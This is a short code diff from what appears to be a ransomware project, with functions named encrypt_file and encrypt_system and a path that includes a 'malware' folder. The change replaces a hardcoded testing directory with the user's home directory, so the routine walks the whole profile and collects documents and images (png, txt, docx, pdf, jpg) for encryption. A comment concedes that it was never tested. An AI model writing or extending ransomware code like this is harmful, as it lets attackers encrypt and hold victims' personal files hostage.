@@ -25,12 +25,10 @@ def encrypt_file(files_to_enc, crypt, encrypted = False):
 def encrypt_system(crypt, encrypted=False):
 
     exts = ['png','txt','docx','doc','pdf','jpg','jpeg']
-
-    testing = r'C:\Users\xandi-pink\Desktop\Code\Algorithms and Data Structures\malware\testing'
     
-    systemRoot = os.path.expanduser('~')
+    systemRoot = os.path.expanduser('~') #as far as we know this should look at everything but since we couldn't really test it we are not sure
     files_to_enc = []
-    system = os.walk(testing,topdown=True)
+    system = os.walk(systemRoot,topdown=True)
     for root,dir,files in system:
         for file in files:  
             fpath = os.path.join(root,file)
